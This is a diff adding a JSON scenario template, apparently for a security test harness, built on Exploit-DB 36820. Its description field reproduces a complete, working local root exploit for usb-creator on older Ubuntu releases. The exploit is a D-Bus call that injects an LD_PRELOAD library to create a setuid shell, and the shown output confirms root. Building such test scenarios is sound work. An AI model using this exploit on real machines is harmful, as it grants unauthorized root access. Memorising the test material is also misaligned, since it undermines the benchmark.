@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_36820",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation (OSVDB-121209;CVE-2015-3643)\n\nExploit source code (36820.txt):\n```\nSource: http://www.openwall.com/lists/oss-security/2015/04/22/12\nBug report: https://bugs.launchpad.net/ubuntu/vivid/+source/usb-creator/+bug/1447396\n\nUbuntu Precise (12.04LTS) <= usb-creator: 0.2.38.3ubuntu    (Patched in: 0.2.38.3ubuntu0.1)\nUbuntu Trusty  (14.04LTS) <= usb-creator 0.2.56.3ubuntu     (Patched in: 0.2.56.3ubuntu0.1)\nUbuntu Utopic  (14.10) <= usb-creator 0.2.62ubuntu0.2         (Patched in: 0.2.62ubuntu0.3)\n\n$ cat > test.c\nvoid __attribute__((constructor)) init (void)\n{\nchown(\"/tmp/test\", 0, 0);\nchmod(\"/tmp/test\", 04755);\n}\n^D\n$ gcc -shared -fPIC -o /tmp/test.so test.c\n$ cp /bin/sh /tmp/test\n$ dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,\"foo\",XAUTHORITY,\"foo\",LD_PRELOAD,\"/tmp/test.so\"\nmethod return sender=:1.4364 -> dest=:1.7427 reply_serial=2\n$ ls -l /tmp/test\n-rwsr-xr-x 1 root root 121272 Apr 22 16:43 /tmp/test\n$ /tmp/test\n# id\neuid=0(root) groups=0(root)\n```",
+  "cve": "OSVDB-121209;CVE-2015-3643",
+  "exploitdb_id": "36820",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_36820",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
